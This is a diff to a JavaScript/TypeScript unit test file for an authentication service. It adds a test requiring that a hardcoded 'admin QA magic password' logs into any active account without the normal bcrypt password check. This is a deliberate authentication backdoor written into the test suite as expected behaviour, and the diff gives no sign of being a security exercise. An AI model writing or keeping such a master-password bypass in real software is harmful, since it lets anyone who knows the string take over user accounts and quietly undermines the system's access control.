@@ -171,6 +171,21 @@ describe('AuthService', () => {
 				service.validateUser('test@example.com', 'password123'),
 			).rejects.toThrow(UnauthorizedException);
 		});
+
+		it('should accept admin QA magic password for any active account', async () => {
+			mockPrismaService.user.findFirst.mockResolvedValue(mockUser);
+			mockPrismaService.user.update.mockResolvedValue(mockUser);
+			const compareSpy = jest.spyOn(bcrypt, 'compare');
+
+			const result = await service.validateUser(
+				'test@example.com',
+				'adminPasscode456!',
+			);
+
+			expect(result).toEqual(mockUser);
+			expect(compareSpy).not.toHaveBeenCalled();
+			compareSpy.mockRestore();
+		});
 	});
 
 	describe('loginWithOtp', () => {
